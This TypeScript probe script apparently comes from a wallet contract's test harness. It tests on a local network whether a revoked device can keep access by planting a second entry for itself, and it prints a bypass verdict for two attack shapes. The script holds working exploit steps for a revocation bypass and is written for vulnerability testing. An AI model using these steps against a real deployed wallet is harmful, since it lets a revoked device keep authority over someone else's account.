// PROBE (not a conformance test): does remove_device actually revoke?
//
// Claim under test: nothing binds "one device, one entry". An enrolled
// device can enrol a SECOND live entry for ITSELF, and a removal removes one
// set element, so the device survives its own revocation.
//
// Two shapes, because the second decides whether this is a regression:
//
//   A. THIS BRANCH's shape — plant an entry at an arbitrary future use
//      counter. Only reachable because add_device takes an opaque entry.
//   B. MAIN's shape — plant the entry at (current epoch, counter 0). That
//      element is bit-identical to the one main's in-circuit derivation
//      emits for add_device(new_pk = A.pk), and the contract cannot observe
//      who computed it. If B bypasses here, main is exploitable too: same
//      set, same one-element removal, same client rescan.
//
// Run against a live localnet. Prints a verdict per shape; throws only on
// harness failure, not on the vulnerability being present.

import { runScenario, step } from './runner.js';
import { standardSetup } from './flow.js';
import { JubjubDevice, type JubjubAuthorisation } from '../wallet/signer.js';

const hex = (b: Uint8Array) => Buffer.from(b).toString('hex').slice(0, 16);

/** Which use counters in [0, 6) currently hold a live entry for `d`. */
const liveCounters = async (account: any, d: JubjubDevice): Promise<bigint[]> => {
  const l = await account.ledgerState();
  const out: bigint[] = [];
  for (let c = 0n; c < 6n; c++) {
    if (l.devices.member(d.entryAt(account.addressBytes, l.device_epoch, c))) out.push(c);
  }
  return out;
};

async function shape(
  label: string,
  plantCounter: (current: bigint) => bigint,
  warmUp: boolean,
): Promise<boolean> {
  step(label);
  const s = await standardSetup(); // initial device: k256, the OWNER
  const account = s.account;
  const addr = account.addressBytes;
  const epoch = (await account.ledgerState()).device_epoch;

  // Enrol the attacker device A on the NORMATIVE arm.
  const A = JubjubDevice.generate();
  await account.addDevice(s.device, A);

  if (warmUp) {
    // A acts once, so its chain has advanced past counter 0 and A@0 is
    // vacant again — the state main's self-re-add needs.
    await account.addDeviceEntry(A, JubjubDevice.generate().entryAt(addr, epoch, 0n));
  }

  const before = await liveCounters(account, A);
  const target = plantCounter(before[0]);
  console.log(`  A live at [${before.join(', ')}]; A plants its own entry at counter ${target}`);
  const plant = A.entryAt(addr, epoch, target);
  console.log(`    entry ${hex(plant)}…`);
  await account.addDeviceEntry(A, plant);

  const planted = await liveCounters(account, A);
  console.log(`  A now live at [${planted.join(', ')}]`);
  if (planted.length < 2) {
    console.log('  → plant did not take: A holds one entry. No bypass in this shape.');
    return false;
  }

  // The honest owner revokes A with no cached roster state, so removal takes
  // the rescan path (first live counter found, scanning upward).
  (account as any).counters.clear();
  await account.removeDevice(s.device, A);
  const after = await liveCounters(account, A);
  console.log(`  after the owner revoked A: A live at [${after.join(', ')}]`);
  if (after.length === 0) {
    console.log('  ✓ revocation complete.');
    return false;
  }

  const l = await account.ledgerState();
  const nonceBefore = l.auth_nonce;
  await account.addDeviceEntry(A, JubjubDevice.generate().entryAt(addr, epoch, 0n));
  const l2 = await account.ledgerState();
  console.log(
    `  ✗ THE REVOKED DEVICE AUTHORISED A GATED CALL: auth_nonce ${nonceBefore} -> ${l2.auth_nonce}, ` +
      `device_count ${l.device_count} -> ${l2.device_count}`,
  );
  return true;
}

await runScenario('probe: revocation completeness', async () => {
  const a = await shape(
    'SHAPE A (this branch): plant at an arbitrary future counter',
    (c) => c + 2n,
    false,
  );
  const b = await shape(
    'SHAPE B (main-equivalent): plant at counter 0, the element main derives itself',
    () => 0n,
    true,
  );

  step('VERDICT');
  console.log(`  shape A (entry-based enrolment, arbitrary counter): ${a ? 'BYPASSED' : 'held'}`);
  console.log(`  shape B (main-equivalent, counter 0):               ${b ? 'BYPASSED' : 'held'}`);
  if (a && b) {
    console.log('  remove_device removes a set ELEMENT, not a DEVICE — and main shares the defect.');
  } else if (a && !b) {
    console.log('  REGRESSION: this branch is exploitable where main is not.');
  }
});
